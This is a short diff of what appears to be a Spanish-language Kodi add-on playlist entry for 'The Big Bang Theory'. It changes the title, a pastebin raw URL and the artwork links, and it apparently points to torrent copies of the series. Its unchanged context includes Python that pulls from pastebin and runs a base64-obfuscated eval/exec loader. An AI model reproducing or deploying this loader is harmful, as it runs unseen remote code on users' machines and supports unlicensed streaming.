@@ -3,7 +3,7 @@
 
 
 <item>
-<title>[COLOR gold]*[/COLOR][COLOR white]The Big Bang Theory Serie Completa [COLOR green]Torrent [/COLOR]</title>    
+<title>[COLOR gold]*[/COLOR][COLOR white] Temporada 1[/COLOR]</title>    
 <link>$doregex[c]</link>
 <regex>
 <name>c</name>
@@ -19,7 +19,7 @@ from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
 from six.moves import urllib_request
 import six
 TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
-url = 'https://pastebin.com/raw/W4d7Fev2'
+url = 'https://pastebin.com/raw/iPBtEmUK'
 titulo = 'Pruebas'
 import base64, codecs
 
@@ -94,8 +94,8 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <page></page>
 </regex>
 <info>Leonard y Sheldon son dos cerebros privilegiados que comparten piso. Aunque los dos, doctores en Física, son capaces de calcular las probabilidades de existencia de otros mundos, no saben cómo relacionarse con los demás, especialmente con las chicas. Penny, una vecina recién llegada, es el polo opuesto a los dos amigos, de modo que su llegada altera la tranquila vida sentimental de Leonard y el desorden obsesivo-compulsivo de Sheldon.</info>
-<thumbnail>https://www.themoviedb.org/t/p/original/nkVMUEcFP2gMkRHWCSxSM272H7k.jpg</thumbnail>
-<fanart>https://www.themoviedb.org/t/p/original/jE5QJSjicV8AYE8g7NoSyMM22Rq.jpg</fanart>
+<thumbnail></thumbnail>
+<fanart></fanart>
 </item>
 
 
